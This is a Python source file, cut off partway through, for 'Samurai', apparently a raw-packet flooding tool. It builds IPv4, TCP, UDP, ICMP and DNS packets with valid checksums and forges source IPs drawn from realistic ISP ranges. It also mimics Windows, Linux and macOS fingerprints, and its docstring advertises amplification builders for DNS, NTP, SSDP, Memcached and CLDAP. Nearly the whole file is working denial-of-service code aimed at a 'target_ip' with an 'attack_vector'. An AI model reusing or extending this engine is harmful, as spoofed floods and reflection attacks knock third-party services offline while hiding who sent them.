"""
Samurai — Zero-Dependency CPU Packet Engine
================================================

High-performance, pure-Python packet construction engine.
Replaces Scapy for the CPU path — **no external dependencies**.

All header offsets, checksums, and field packing are done via ``struct``
and raw ``bytearray`` manipulation, yielding 30-100× faster packet
construction compared to Scapy's OOP-based approach.

Supported protocols:
    • IPv4 (with options, TOS, TTL, fragmentation)
    • TCP  (with options: MSS, SACK-OK, Timestamp, WScale, NOP, EOL)
    • UDP  (with optional checksum)
    • ICMP (Echo Request)
    • DNS  (standard queries, EDNS0)
    • Ethernet (L2 framing for TX_RING / AF_XDP)

Features:
    • OS fingerprint mimicry (Windows / Linux / macOS profiles)
    • IP spoofing (random, realistic, subnet, list)
    • Polymorphic HTTP payloads
    • Amplification packet builders (DNS, NTP, SSDP, Memcached, CLDAP)
    • IP fragmentation
    • Packet pooling for batch generation

Author: Samurai Team
"""

from __future__ import annotations

import ipaddress
import logging
import os
import random
import socket
import struct
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Union

log = logging.getLogger(__name__)

# ════════════════════════════════════════════════════════════════════════════
#  Constants
# ════════════════════════════════════════════════════════════════════════════

# Protocol numbers
PROTO_ICMP = 1
PROTO_TCP  = 6
PROTO_UDP  = 17

# TCP Flags
TCP_FIN = 0x01
TCP_SYN = 0x02
TCP_RST = 0x04
TCP_PSH = 0x08
TCP_ACK = 0x10
TCP_URG = 0x20
TCP_ECE = 0x40
TCP_CWR = 0x80

_TCP_FLAG_MAP: Dict[str, int] = {
    "F": TCP_FIN, "S": TCP_SYN, "R": TCP_RST, "P": TCP_PSH,
    "A": TCP_ACK, "U": TCP_URG, "E": TCP_ECE, "C": TCP_CWR,
}
_TCP_FLAG_NAME_MAP: Dict[str, int] = {
    "FIN": TCP_FIN,
    "SYN": TCP_SYN,
    "RST": TCP_RST,
    "PSH": TCP_PSH,
    "ACK": TCP_ACK,
    "URG": TCP_URG,
    "ECE": TCP_ECE,
    "CWR": TCP_CWR,
}
_TCP_FLAG_NAME_TOKENS = tuple(sorted(_TCP_FLAG_NAME_MAP.keys(), key=len, reverse=True))
_TCP_FLAG_PARSE_CACHE: Dict[str, int] = {}

# TCP Option kinds
TCP_OPT_EOL       = 0
TCP_OPT_NOP       = 1
TCP_OPT_MSS       = 2
TCP_OPT_WSCALE    = 3
TCP_OPT_SACK_OK   = 4
TCP_OPT_SACK      = 5
TCP_OPT_TIMESTAMP = 8

# Ethernet
ETHERTYPE_IPV4 = 0x0800
ETH_HEADER_LEN = 14

# ICMP
ICMP_ECHO_REQUEST = 8

# DNS
DNS_QUERY_FLAG = 0x0100  # RD=1
DNS_QR_QUERY   = 0x0000
DNS_CLASS_IN   = 1

# DNS query types
_DNS_QTYPE_MAP: Dict[str, int] = {
    "A": 1, "NS": 2, "CNAME": 5, "SOA": 6, "PTR": 12,
    "MX": 15, "TXT": 16, "AAAA": 28, "SRV": 33, "ANY": 255,
}

_PROTO_STR_TO_INT: Dict[str, int] = {
    "tcp": PROTO_TCP,
    "udp": PROTO_UDP,
    "icmp": PROTO_ICMP,
}

# ════════════════════════════════════════════════════════════════════════════
#  OS Fingerprint Profiles
# ════════════════════════════════════════════════════════════════════════════

@dataclass(frozen=True)
class OSProfile:
    """TCP/IP stack fingerprint profile for OS mimicry."""
    name:        str
    ttl:         int
    window:      int
    tcp_options: tuple  # Tuple of (kind, value) pairs

# Pre-built profiles
OS_WINDOWS_10 = OSProfile(
    name="windows_10",
    ttl=128,
    window=64240,
    tcp_options=(
        (TCP_OPT_MSS, 1460),
        (TCP_OPT_NOP, None),
        (TCP_OPT_WSCALE, 8),
        (TCP_OPT_NOP, None),
        (TCP_OPT_NOP, None),
        (TCP_OPT_SACK_OK, None),
    ),
)

OS_LINUX_5 = OSProfile(
    name="linux_5",
    ttl=64,
    window=29200,
    tcp_options=(
        (TCP_OPT_MSS, 1460),
        (TCP_OPT_SACK_OK, None),
        (TCP_OPT_TIMESTAMP, None),   # Value filled at build time
        (TCP_OPT_NOP, None),
        (TCP_OPT_WSCALE, 7),
    ),
)

OS_MACOS_14 = OSProfile(
    name="macos_14",
    ttl=64,
    window=65535,
    tcp_options=(
        (TCP_OPT_MSS, 1460),
        (TCP_OPT_NOP, None),
        (TCP_OPT_WSCALE, 6),
        (TCP_OPT_NOP, None),
        (TCP_OPT_NOP, None),
        (TCP_OPT_TIMESTAMP, None),
        (TCP_OPT_SACK_OK, None),
        (TCP_OPT_EOL, None),
    ),
)

OS_PROFILES = (OS_WINDOWS_10, OS_LINUX_5, OS_MACOS_14)
_PROFILE_TCP_OPTIONS_CACHE: Dict[str, Tuple[bytes, Tuple[int, ...]]] = {}


def _get_profile_tcp_options_cached(profile: OSProfile) -> Tuple[bytes, Tuple[int, ...]]:
    """
    Return cached TCP option bytes template for an OS profile.

    The returned tuple is:
        (base_option_bytes_with_tsval_zero, tsval_offsets)
    """
    cached = _PROFILE_TCP_OPTIONS_CACHE.get(profile.name)
    if cached is not None:
        return cached

    buf = bytearray()
    tsval_offsets: List[int] = []

    for kind, value in profile.tcp_options:
        if kind == TCP_OPT_EOL:
            buf.append(0)
        elif kind == TCP_OPT_NOP:
            buf.append(1)
        elif kind == TCP_OPT_MSS:
            buf.extend(struct.pack("!BBH", 2, 4, value if value else 1460))
        elif kind == TCP_OPT_WSCALE:
            buf.extend(struct.pack("!BBB", 3, 3, value if value else 7))
        elif kind == TCP_OPT_SACK_OK:
            buf.extend(struct.pack("!BB", 4, 2))
        elif kind == TCP_OPT_TIMESTAMP:
            # Track TSval offset (Kind + Len + TSval + TSecr)
            tsval_offsets.append(len(buf) + 2)
            buf.extend(struct.pack("!BBII", 8, 10, 0, 0))

    while len(buf) % 4 != 0:
        buf.append(0)

    out = (bytes(buf), tuple(tsval_offsets))
    _PROFILE_TCP_OPTIONS_CACHE[profile.name] = out
    return out


def _build_profile_tcp_options(profile: OSProfile) -> bytes:
    """Build TCP options for an OS profile using cached templates."""
    base, tsval_offsets = _get_profile_tcp_options_cached(profile)
    if not tsval_offsets:
        return base

    out = bytearray(base)
    for off in tsval_offsets:
        struct.pack_into("!I", out, off, random.randint(1, 0xFFFFFFFF))
    return bytes(out)


# ════════════════════════════════════════════════════════════════════════════
#  Checksum Utilities
# ════════════════════════════════════════════════════════════════════════════

def _checksum(data: bytes | bytearray | memoryview) -> int:
    """
    Compute the Internet checksum (RFC 1071) for the given data.

    This is the one's complement of the one's complement sum of all 16-bit words.
    """
    if len(data) % 2 == 1:
        data = bytes(data) + b'\x00'

    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) | data[i + 1]
        s += w

    # Fold 32-bit carry into 16-bit
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)

    return (~s) & 0xFFFF


def _pseudo_header_checksum(
    src_ip: int,
    dst_ip: int,
    protocol: int,
    l4_length: int,
) -> int:
    """Compute the sum of the pseudo-header for TCP/UDP checksum."""
    pseudo = struct.pack(
        "!IIBBH",
        src_ip,
        dst_ip,
        0,  # reserved
        protocol,
        l4_length,
    )
    s = 0
    for i in range(0, len(pseudo), 2):
        s += (pseudo[i] << 8) | pseudo[i + 1]
    return s


# ════════════════════════════════════════════════════════════════════════════
#  IP Address Utilities
# ════════════════════════════════════════════════════════════════════════════

def ip_to_int(ip_str: str) -> int:
    """Convert dotted-quad IPv4 to 32-bit integer."""
    parts = ip_str.split(".")
    return (int(parts[0]) << 24) | (int(parts[1]) << 16) | (int(parts[2]) << 8) | int(parts[3])


def int_to_ip(val: int) -> str:
    """Convert 32-bit integer to dotted-quad."""
    return f"{(val >> 24) & 0xFF}.{(val >> 16) & 0xFF}.{(val >> 8) & 0xFF}.{val & 0xFF}"


def ip_to_bytes(ip_str: str) -> bytes:
    """Convert dotted-quad IPv4 to 4-byte network-order bytes."""
    return struct.pack("!I", ip_to_int(ip_str))


# ════════════════════════════════════════════════════════════════════════════
#  IP Spoofing
# ════════════════════════════════════════════════════════════════════════════

# Cached IPs from file (keyed by absolute file path)
_CACHED_IP_LISTS: Dict[str, List[str]] = {}

# Cached local source IP per destination
_LOCAL_SRC_IP_CACHE: Dict[str, str] = {}

# Realistic IP ranges (major ISPs, cloud providers — non-reserved)
_REALISTIC_PREFIXES = [
    (1, 0, 0, 0,   1, 255),    # 1.x.x.x
    (5, 0, 0, 0,   5, 255),    # 5.x.x.x
    (23, 0, 0, 0,  23, 255),   # 23.x.x.x
    (31, 0, 0, 0,  31, 255),   # 31.x.x.x
    (37, 0, 0, 0,  37, 255),   # 37.x.x.x
    (45, 0, 0, 0,  45, 255),   # 45.x.x.x
    (46, 0, 0, 0,  46, 255),   # 46.x.x.x
    (51, 0, 0, 0,  51, 255),   # 51.x.x.x
    (62, 0, 0, 0,  62, 255),   # 62.x.x.x
    (72, 0, 0, 0,  72, 255),   # 72.x.x.x
    (78, 0, 0, 0,  78, 255),   # 78.x.x.x
    (80, 0, 0, 0,  95, 255),   # 80-95.x.x.x  (European ISPs)
    (104, 0, 0, 0, 104, 255),  # 104.x.x.x (Cloudflare/AWS)
    (141, 0, 0, 0, 141, 255),  # 141.x.x.x
    (151, 0, 0, 0, 151, 255),  # 151.x.x.x
    (176, 0, 0, 0, 176, 255),  # 176.x.x.x
    (185, 0, 0, 0, 185, 255),  # 185.x.x.x
    (193, 0, 0, 0, 195, 255),  # 193-195.x.x.x
    (198, 0, 0, 0, 198, 255),  # 198.x.x.x
    (203, 0, 0, 0, 203, 255),  # 203.x.x.x (APNIC)
    (212, 0, 0, 0, 212, 255),  # 212.x.x.x
]


def generate_random_ip() -> str:
    """Generate a random IPv4 address (non-reserved)."""
    while True:
        a = random.randint(1, 223)
        b = random.randint(0, 255)
        c = random.randint(0, 255)
        d = random.randint(1, 254)
        # Skip private / loopback / multicast / reserved
        if a in (10, 127) or (a == 172 and 16 <= b <= 31) or (a == 192 and b == 168):
            continue
        if a == 0 or a >= 224:
            continue
        return f"{a}.{b}.{c}.{d}"


def generate_realistic_ip() -> str:
    """Generate a realistic-looking IPv4 from common ISP/cloud ranges."""
    prefix = random.choice(_REALISTIC_PREFIXES)
    a = random.randint(prefix[0], prefix[4])
    b = random.randint(0, 255)
    c = random.randint(0, 255)
    d = random.randint(1, 254)
    return f"{a}.{b}.{c}.{d}"


def generate_ip_from_subnet(subnet: str) -> str:
    """Generate a random IP within the given CIDR subnet."""
    try:
        network = ipaddress.ip_network(subnet, strict=False)
        return str(ipaddress.ip_address(
            random.randint(int(network.network_address) + 1, int(network.broadcast_address) - 1)
        ))
    except (ValueError, TypeError):
        log.error(f"Invalid subnet: {subnet}")
        return generate_random_ip()


def load_ips_from_file(file_path: str) -> List[str]:
    """Load IP list from a file (cached)."""
    cache_key = os.path.abspath(file_path)
    if cache_key in _CACHED_IP_LISTS:
        return _CACHED_IP_LISTS[cache_key]
    try:
        with open(file_path, "r") as f:
            ip_list = [
                line.strip() for line in f
                if line.strip() and not line.startswith("#")
            ]
        _CACHED_IP_LISTS[cache_key] = ip_list
        return ip_list
    except FileNotFoundError:
        log.error(f"IP list file not found: {file_path}")
        return []


def resolve_local_source_ip(target_ip: str) -> str:
    """
    Resolve a concrete local IPv4 source address for a destination.

    This avoids building TCP/UDP checksums with 0.0.0.0 in non-spoof mode.
    """
    cached = _LOCAL_SRC_IP_CACHE.get(target_ip)
    if cached:
        return cached

    for probe_ip in (target_ip, "8.8.8.8"):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.connect((probe_ip, 53))
                local_ip = sock.getsockname()[0]
            if local_ip and local_ip != "0.0.0.0":
                _LOCAL_SRC_IP_CACHE[target_ip] = local_ip
                return local_ip
        except OSError:
            continue

    try:
        host_ip = socket.gethostbyname(socket.gethostname())
        if host_ip and host_ip != "0.0.0.0":
            _LOCAL_SRC_IP_CACHE[target_ip] = host_ip
            return host_ip
    except OSError:
        pass

    _LOCAL_SRC_IP_CACHE[target_ip] = "127.0.0.1"
    return "127.0.0.1"


def get_spoofed_ip(
    mode: str = "realistic",
    subnet: Optional[str] = None,
    list_file: Optional[str] = None,
) -> str:
    """Get a spoofed source IP based on the configured mode."""
    if mode == "subnet" and subnet:
        return generate_ip_from_subnet(subnet)
    elif mode == "list" and list_file:
        ip_list = load_ips_from_file(list_file)
        return random.choice(ip_list) if ip_list else generate_random_ip()
    elif mode == "random":
        return generate_random_ip()
    else:
        return generate_realistic_ip()


# ════════════════════════════════════════════════════════════════════════════
#  TCP Options Builder
# ════════════════════════════════════════════════════════════════════════════

_TCP_OPTIONS_CACHE: Dict[Tuple[Tuple[int, Optional[int], Optional[int]], ...], bytes] = {}


def _tcp_options_cache_key(options: tuple | list) -> Optional[Tuple[Tuple[int, Optional[int], Optional[int]], ...]]:
    """
    Build a stable cache key for deterministic TCP options.

    Dynamic timestamp options (value is not tuple/list) are excluded from cache.
    """
    norm: List[Tuple[int, Optional[int], Optional[int]]] = []
    for kind, value in options:
        if kind == TCP_OPT_TIMESTAMP:
            if isinstance(value, (tuple, list)) and len(value) >= 2:
                norm.append((int(kind), int(value[0]), int(value[1])))
            else:
                return None
        elif value is None:
            norm.append((int(kind), None, None))
        elif isinstance(value, int):
            norm.append((int(kind), int(value), None))
        else:
            return None
    return tuple(norm)


def build_tcp_options(options: tuple | list) -> bytes:
    """
    Build raw TCP options bytes from a list of (kind, value) tuples.

    Supported options:
        - (TCP_OPT_EOL, None)                  → 1 byte: 0x00
        - (TCP_OPT_NOP, None)                  → 1 byte: 0x01
        - (TCP_OPT_MSS, mss_value)             → 4 bytes: kind(1) + len(1) + value(2)
        - (TCP_OPT_WSCALE, shift_count)        → 3 bytes: kind(1) + len(1) + value(1) + pad
        - (TCP_OPT_SACK_OK, None)              → 2 bytes: kind(1) + len(1)
        - (TCP_OPT_TIMESTAMP, (tsval, tsecr))  → 10 bytes: kind(1) + len(1) + tsval(4) + tsecr(4)
    """
    cache_key = _tcp_options_cache_key(options)
    if cache_key is not None:
        cached = _TCP_OPTIONS_CACHE.get(cache_key)
        if cached is not None:
            return cached

    buf = bytearray()
    for kind, value in options:
        if kind == TCP_OPT_EOL:
            buf.append(0)
        elif kind == TCP_OPT_NOP:
            buf.append(1)
        elif kind == TCP_OPT_MSS:
            # Kind=2, Length=4, MSS=2
            buf.extend(struct.pack("!BBH", 2, 4, value if value else 1460))
        elif kind == TCP_OPT_WSCALE:
            # Kind=3, Length=3, Shift=1
            buf.extend(struct.pack("!BBB", 3, 3, value if value else 7))
        elif kind == TCP_OPT_SACK_OK:
            # Kind=4, Length=2
            buf.extend(struct.pack("!BB", 4, 2))
        elif kind == TCP_OPT_TIMESTAMP:
            # Kind=8, Length=10, TSval=4, TSecr=4
            if isinstance(value, (tuple, list)):
                tsval, tsecr = value
            else:
                tsval = random.randint(1, 0xFFFFFFFF)
                tsecr = 0
            buf.extend(struct.pack("!BBII", 8, 10, tsval, tsecr))
        else:
            # Unknown option: skip
            pass

    # Pad to 4-byte boundary (TCP header must be 32-bit aligned)
    while len(buf) % 4 != 0:
        buf.append(0)  # EOL/padding

    out = bytes(buf)
    if cache_key is not None:
        _TCP_OPTIONS_CACHE[cache_key] = out
        # Bound cache growth.
        if len(_TCP_OPTIONS_CACHE) > 256:
            _TCP_OPTIONS_CACHE.pop(next(iter(_TCP_OPTIONS_CACHE)))
    return out


# ════════════════════════════════════════════════════════════════════════════
#  Header Construction
# ════════════════════════════════════════════════════════════════════════════

def build_ipv4_header(
    src_ip: str | int,
    dst_ip: str | int,
    protocol: int,
    payload_len: int,
    *,
    ttl: int = 64,
    tos: int = 0,
    identification: int = 0,
    flags_frag: int = 0x4000,  # DF by default
    options: bytes = b"",
) -> bytearray:
    """
    Build a raw IPv4 header as a bytearray.

    The checksum is computed and embedded.

    Args:
        src_ip: Source IP (str or int)
        dst_ip: Destination IP (str or int)
        protocol: IP protocol number
        payload_len: Length of L4 header + payload
        ttl: Time-to-live
        tos: Type-of-Service
        identification: IP identification field (0 = random)
        flags_frag: Flags + fragment offset (default DF=1)
        options: Raw IP options bytes (must be 4-byte aligned)

    Returns:
        bytearray containing the complete IPv4 header with valid checksum.
    """
    src_int = ip_to_int(src_ip) if isinstance(src_ip, str) else src_ip
    dst_int = ip_to_int(dst_ip) if isinstance(dst_ip, str) else dst_ip

    ihl = (20 + len(options)) // 4  # 5 without options
    ver_ihl = (4 << 4) | ihl
    total_len = ihl * 4 + payload_len

    if identification == 0:
        identification = random.randint(0, 0xFFFF)

    hdr = bytearray(struct.pack(
        "!BBHHHBBHII",
        ver_ihl,
        tos,
        total_len,
        identification,
        flags_frag,
        ttl,
        protocol,
        0,  # checksum placeholder
        src_int,
        dst_int,
    ))

    # Append IP options
    if options:
        hdr.extend(options)

    # Compute and insert checksum
    cksum = _checksum(hdr)
    struct.pack_into("!H", hdr, 10, cksum)

    return hdr


def build_tcp_header(
    src_port: int,
    dst_port: int,
    *,
    seq: int = 0,
    ack: int = 0,
    flags: int = TCP_SYN,
    window: int = 65535,
    urgent: int = 0,
    options_bytes: bytes = b"",
    # For checksum calculation:
    src_ip_int: int = 0,
    dst_ip_int: int = 0,
    payload: bytes = b"",
) -> bytearray:
    """
    Build a raw TCP header.

    The checksum is computed using the pseudo-header + TCP header + payload.
    """
    data_offset = (20 + len(options_bytes)) // 4
    if (20 + len(options_bytes)) % 4 != 0:
        data_offset += 1

    offset_flags = (data_offset << 12) | flags

    hdr = bytearray(struct.pack(
        "!HHIIHHH",
        src_port,
        dst_port,
        seq,
        ack,
        offset_flags,
        window,
        0,  # checksum placeholder
    ))
    hdr.extend(struct.pack("!H", urgent))

    # Append TCP options
    if options_bytes:
        hdr.extend(options_bytes)

    # Pad to data_offset * 4
    target_len = data_offset * 4
    while len(hdr) < target_len:
        hdr.append(0)

    # Compute TCP checksum (pseudo-header + header + payload)
    l4_data = bytes(hdr) + payload
    l4_len = len(l4_data)

    pseudo_sum = _pseudo_header_checksum(src_ip_int, dst_ip_int, PROTO_TCP, l4_len)

    # Sum L4 data
    s = pseudo_sum
    d = l4_data
    if len(d) % 2 == 1:
        d = d + b'\x00'
    for i in range(0, len(d), 2):
        s += (d[i] << 8) | d[i + 1]
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    cksum = (~s) & 0xFFFF

    # Insert checksum at offset 16
    struct.pack_into("!H", hdr, 16, cksum)

    return hdr


def build_udp_header(
    src_port: int,
    dst_port: int,
    payload: bytes = b"",
    *,
    src_ip_int: int = 0,
    dst_ip_int: int = 0,
    compute_checksum: bool = True,
) -> bytearray:
    """Build a raw UDP header with optional checksum."""
    length = 8 + len(payload)

    hdr = bytearray(struct.pack(
        "!HHHH",
        src_port,
        dst_port,
        length,
        0,  # checksum placeholder
    ))

    if compute_checksum and (src_ip_int or dst_ip_int):
        l4_data = bytes(hdr) + payload
        l4_len = len(l4_data)

        pseudo_sum = _pseudo_header_checksum(src_ip_int, dst_ip_int, PROTO_UDP, l4_len)
        s = pseudo_sum
        d = l4_data
        if len(d) % 2 == 1:
            d = d + b'\x00'
        for i in range(0, len(d), 2):
            s += (d[i] << 8) | d[i + 1]
        while s >> 16:
            s = (s & 0xFFFF) + (s >> 16)
        cksum = (~s) & 0xFFFF
        if cksum == 0:
            cksum = 0xFFFF  # UDP zero → 0xFFFF per RFC 768
        struct.pack_into("!H", hdr, 6, cksum)

    return hdr


def build_icmp_echo(
    identifier: int = 0,
    sequence: int = 0,
    payload: bytes = b"",
) -> bytearray:
    """Build an ICMP Echo Request packet (type 8, code 0)."""
    if identifier == 0:
        identifier = random.randint(0, 0xFFFF)

    hdr = bytearray(struct.pack(
        "!BBHHH",
        ICMP_ECHO_REQUEST,
        0,  # code
        0,  # checksum placeholder
        identifier,
        sequence,
    ))
    hdr.extend(payload)

    cksum = _checksum(hdr)
    struct.pack_into("!H", hdr, 2, cksum)

    return hdr


def build_ethernet_header(
    dst_mac: bytes = b"\xff\xff\xff\xff\xff\xff",
    src_mac: bytes = b"\x00\x00\x00\x00\x00\x00",
    ethertype: int = ETHERTYPE_IPV4,
) -> bytes:
    """Build a 14-byte Ethernet frame header."""
    return dst_mac + src_mac + struct.pack("!H", ethertype)


# ════════════════════════════════════════════════════════════════════════════
#  DNS Builder
# ════════════════════════════════════════════════════════════════════════════

def _encode_dns_name(name: str) -> bytes:
    """Encode a domain name in DNS wire format (label encoding)."""
    if not name or name == ".":
        return b"\x00"

    labels = name.rstrip(".").split(".")
    buf = bytearray()
    total_len = 1  # root label
    for label in labels:
        if not label:
            raise ValueError(f"Invalid DNS name with empty label: {name!r}")
        try:
            encoded = label.encode("ascii")
        except UnicodeEncodeError as exc:
            raise ValueError(f"DNS labels must be ASCII: {name!r}") from exc
        if len(encoded) > 63:
            raise ValueError(f"DNS label too long (>63): {label!r}")
        if total_len + 1 + len(encoded) > 255:
            raise ValueError(f"DNS name too long (>255 octets): {name!r}")
        buf.append(len(encoded))
        buf.extend(encoded)
        total_len += 1 + len(encoded)
    buf.append(0)  # root label
    return bytes(buf)


def build_dns_query(
    qname: str = "example.com",
    qtype: str = "A",
    recursive: bool = True,
    edns: bool = False,
    transaction_id: int = 0,
) -> bytes:
    """
    Build a DNS query payload (to be encapsulated in UDP).

    Returns raw bytes of the DNS message.
    """
    if transaction_id == 0:
        transaction_id = random.randint(0, 0xFFFF)

    flags = DNS_QR_QUERY
    if recursive:
        flags |= DNS_QUERY_FLAG  # RD=1

    qtype_num = _DNS_QTYPE_MAP.get(qtype.upper(), 1)

    # Header: ID(2) + Flags(2) + QDCount(2) + ANCount(2) + NSCount(2) + ARCount(2)
    arcount = 1 if edns else 0
    hdr = struct.pack("!HHHHHH", transaction_id, flags, 1, 0, 0, arcount)

    # Question section
    qname_enc = _encode_dns_name(qname)
    question = qname_enc + struct.pack("!HH", qtype_num, DNS_CLASS_IN)

    # EDNS0 OPT RR (if enabled)
    edns_rr = b""
    if edns:
        # Name=root(0x00), Type=OPT(41), UDP payload size=4096, etc.
        edns_rr = struct.pack("!BHHIH", 0, 41, 4096, 0, 0)

    return hdr + question + edns_rr


# ════════════════════════════════════════════════════════════════════════════
#  TCP Flag Parser
# ════════════════════════════════════════════════════════════════════════════

def parse_tcp_flags(flags_str: str) -> int:
    """
    Parse a TCP flag string (e.g. "SA", "SYN", "FIN+ACK") into a bitmask.
    """
    if not flags_str:
        return 0

    def _parse_token(token: str) -> int:
        if token in _TCP_FLAG_NAME_MAP:
            return _TCP_FLAG_NAME_MAP[token]
        if token in _TCP_FLAG_MAP:
            return _TCP_FLAG_MAP[token]

        # Support compact forms ("SA") and glued long forms ("SYNACK")
        result_local = 0
        idx = 0
        while idx < len(token):
            matched = False
            for long_name in _TCP_FLAG_NAME_TOKENS:
                if token.startswith(long_name, idx):
                    result_local |= _TCP_FLAG_NAME_MAP[long_name]
                    idx += len(long_name)
                    matched = True
                    break
            if matched:
                continue
            result_local |= _TCP_FLAG_MAP.get(token[idx], 0)
            idx += 1
        return result_local

    normalized = str(flags_str).upper()
    normalized_key = normalized
    for sep in ("+", ",", "/", "|"):
        normalized_key = normalized_key.replace(sep, " ")
    normalized_key = " ".join(normalized_key.split())

    cached = _TCP_FLAG_PARSE_CACHE.get(normalized_key)
    if cached is not None:
        return cached

    result = 0
    for sep in ("+", ",", "/", "|"):
        normalized = normalized.replace(sep, " ")
    for token in normalized.split():
        result |= _parse_token(token)
    _TCP_FLAG_PARSE_CACHE[normalized_key] = result
    if len(_TCP_FLAG_PARSE_CACHE) > 256:
        _TCP_FLAG_PARSE_CACHE.pop(next(iter(_TCP_FLAG_PARSE_CACHE)))
    return result


# ════════════════════════════════════════════════════════════════════════════
#  High-Level Packet Builders
# ════════════════════════════════════════════════════════════════════════════

@dataclass
class PacketConfig:
    """Configuration for CPU packet generation (API-compatible with packet.py)."""
    target_ip:        str
    target_port:      int
    protocol:         str = "tcp"
    spoof:            bool = False
    spoof_opts:       'SpoofingOptions' = None
    payload:          Optional[Union[bytes, str]] = None
    tcp_flags:        str = "S"
    ttl:              Optional[int] = None
    tos:              Optional[int] = None
    window:           Optional[int] = None
    fragment_enabled: bool = False
    fragment_size:    int = 800
    pad_size:         int = 0
    attack_vector:    str = "basic"
    dns_name:         str = "example.com"
    dns_qtype:        Union[str, List[str]] = "A"
    dns_edns:         bool = False
    dns_recursive:    bool = True
    target_ip_int:    int = field(init=False, repr=False, default=0)
    protocol_int:     int = field(init=False, repr=False, default=0)
    tcp_flags_int:    int = field(init=False, repr=False, default=0)
    fixed_tcp_options_bytes: bytes = field(init=False, repr=False, default=b"")
    precomputed_profile: Optional[OSProfile] = field(init=False, repr=False, default=None)

    def __post_init__(self):
        if self.spoof_opts is None:
            self.spoof_opts = SpoofingOptions()
        self.protocol = str(self.protocol or "tcp").lower()
        self.protocol_int = int(_PROTO_STR_TO_INT.get(self.protocol, 0) or 0)
        try:
            self.target_ip_int = ip_to_int(self.target_ip)
        except Exception:
            self.target_ip_int = 0
        if self.protocol == "tcp":
            self.tcp_flags_int = parse_tcp_flags(self.tcp_flags)
        else:
            self.tcp_flags_int = 0

        fixed_profile_name = str(os.environ.get("SAMURAI_CPU_FIXED_OS_PROFILE", "") or "").strip().lower()
        if fixed_profile_name:
            for prof in OS_PROFILES:
                if str(prof.name).lower() == fixed_profile_name:
                    self.precomputed_profile = prof
                    base_opts, ts_offsets = _get_profile_tcp_options_cached(prof)
                    if not ts_offsets:
                        self.fixed_tcp_options_bytes = base_opts
                    break


@dataclass
class SpoofingOptions:
    """IP spoofing configuration."""
    mode:      str = "realistic"
    subnet:    Optional[str] = None
    list_file: Optional[str] = None


def _get_source_ip(cfg: PacketConfig) -> str:
    """Determine source IP based on spoofing configuration."""
    if cfg.spoof and cfg.spoof_opts:
        return get_spoofed_ip(
            mode=cfg.spoof_opts.mode,
            subnet=cfg.spoof_opts.subnet,
            list_file=cfg.spoof_opts.list_file,
        )
    return resolve_local_source_ip(cfg.target_ip)


def _select_os_profile() -> OSProfile:
    """Select a random OS fingerprint profile."""
    return random.choice(OS_PROFILES)


def build_transport_packet(cfg: PacketConfig) -> bytes:
    """
    Build a raw IPv4 + TCP/UDP/ICMP packet as bytes.

    This is the primary packet builder for the CPU path.
    Returns the raw IP packet (no Ethernet).
    """
    profile = cfg.precomputed_profile or _select_os_profile()

    # Source IP
    src_ip = _get_source_ip(cfg)
    src_ip_int = ip_to_int(src_ip) if src_ip != "0.0.0.0" else 0
    dst_ip_int = cfg.target_ip_int or ip_to_int(cfg.target_ip)

    # TTL / TOS
    ttl = cfg.ttl if cfg.ttl is not None else profile.ttl
    tos = cfg.tos if cfg.tos is not None else 0

    # Source port
    src_port = random.randint(1024, 65535)

    proto = cfg.protocol
    is_syn_only = False

    if proto == "tcp":
        # Parse flags
        flags_int = int(cfg.tcp_flags_int)
        is_syn_only = (flags_int & TCP_SYN) and not (flags_int & (TCP_ACK | TCP_PSH))

        # Window
        window = cfg.window if cfg.window else profile.window

        # TCP options (cached profile options + timestamp patching)
        if cfg.fixed_tcp_options_bytes:
            options_bytes = cfg.fixed_tcp_options_bytes
        else:
            options_bytes = _build_profile_tcp_options(profile)

        # Payload
        payload = b""
        if cfg.payload:
            if isinstance(cfg.payload, (bytes, bytearray)):
                payload = bytes(cfg.payload)
            else:
                payload = str(cfg.payload).encode()
        elif not is_syn_only:
            # Random payload for non-SYN packets
            payload_len = random.randint(16, 128)
            payload = os.urandom(payload_len)

        # SYN-only stealth: no payload
        if is_syn_only:
            payload = b""

        # Build TCP header
        tcp_hdr = build_tcp_header(
            src_port=src_port,
            dst_port=cfg.target_port,
            seq=random.randint(0, 0xFFFFFFFF),
            ack=random.randint(0, 0xFFFFFFFF) if (flags_int & TCP_ACK) else 0,
            flags=flags_int,
            window=window,
            options_bytes=options_bytes,
            src_ip_int=src_ip_int,
            dst_ip_int=dst_ip_int,
            payload=payload,
        )

        l4_data = bytes(tcp_hdr) + payload

    elif proto == "udp":
        payload = b""
        if cfg.payload:
            if isinstance(cfg.payload, (bytes, bytearray)):
                payload = bytes(cfg.payload)
            else:
                payload = str(cfg.payload).encode()

        udp_hdr = build_udp_header(
            src_port=src_port,
            dst_port=cfg.target_port,
            payload=payload,
            src_ip_int=src_ip_int,
            dst_ip_int=dst_ip_int,
        )
        l4_data = bytes(udp_hdr) + payload

    elif proto == "icmp":
        icmp_payload = b""
        if cfg.payload:
            if isinstance(cfg.payload, (bytes, bytearray)):
                icmp_payload = bytes(cfg.payload)
            else:
                icmp_payload = str(cfg.payload).encode()
        else:
            icmp_payload = os.urandom(32)

        icmp_hdr = build_icmp_echo(payload=icmp_payload)
        l4_data = bytes(icmp_hdr)

    else:
        raise ValueError(f"Unsupported protocol: {proto}")

    # Build IP header
    ip_hdr = build_ipv4_header(
        src_ip=src_ip_int or 0,
        dst_ip=dst_ip_int,
        protocol=cfg.protocol_int or _PROTO_STR_TO_INT[proto],
        payload_len=len(l4_data),
        ttl=ttl,
        tos=tos,
    )

    packet = bytes(ip_hdr) + l4_data

    # Padding
    if not is_syn_only and cfg.pad_size > 0 and len(packet) < cfg.pad_size:
        packet += b"\x00" * (cfg.pad_size - len(packet))

    return packet


def build_dns_packet(cfg: PacketConfig) -> bytes:
    """Build a complete IPv4 + UDP + DNS query packet."""
    src_ip = _get_source_ip(cfg)
    src_ip_int = ip_to_int(src_ip) if src_ip != "0.0.0.0" else 0
    dst_ip_int = cfg.target_ip_int or ip_to_int(cfg.target_ip)
    src_port = random.randint(1024, 65535)

    # Select query type
    qtype = cfg.dns_qtype
    if isinstance(qtype, list):
        qtype = random.choice(qtype)

    dns_payload = build_dns_query(
        qname=cfg.dns_name,
        qtype=qtype,
        recursive=cfg.dns_recursive,
        edns=cfg.dns_edns,
    )

    udp_hdr = build_udp_header(
